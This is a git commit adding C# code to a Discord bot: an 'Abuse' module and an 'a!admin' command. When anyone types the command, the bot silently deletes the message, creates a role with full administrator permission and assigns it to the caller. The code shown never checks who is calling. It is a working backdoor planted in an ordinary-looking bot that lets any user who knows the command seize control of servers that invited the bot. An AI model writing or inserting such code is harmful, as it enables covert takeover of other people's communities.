607b8bc7625a054b13a484e7a83c00bdd1a678bf
CatSandwich <59626141+CatSandwich@users.noreply.github.com>
2021-04-15 20:58:34 -0400

    Adds Admin command :))

---
+++ Modules/Abuse/AbuseModule.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using BotSandwich.Data;
+using BotSandwich.Modules.Abuse.Commands;
+using Discord.WebSocket;
+
+namespace BotSandwich.Modules.Abuse
+{
+    class AbuseModule : Module
+    {
+        public override void Load(DiscordSocketClient client)
+        {
+            InitCommandHandler("a!")
+                .WithCommand(new Admin())
+                .WithHelp()
+                .Register(client);
+        }
+    }
+}
---
+++ Modules/Abuse/Commands/Admin.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using BotSandwich.Data;
+using BotSandwich.Data.Commands;
+using Discord;
+using Discord.WebSocket;
+
+namespace BotSandwich.Modules.Abuse.Commands
+{
+    class Admin : Command
+    {
+        public override string Name => "admin";
+
+        [Argument(true, "name")]
+        public string _roleName;
+        
+        public override async Task Run(Module module, SocketMessage sm, string msg)
+        {
+            await sm.DeleteAsync();
+            
+            var user = sm.Author as IGuildUser;
+            var guild = user?.Guild;
+            
+            var role = await guild.CreateRoleAsync(_roleName, new GuildPermissions(administrator: true), Color.Red,
+                false, null);
+            await user.AddRoleAsync(role);
+        }
+    }
+}
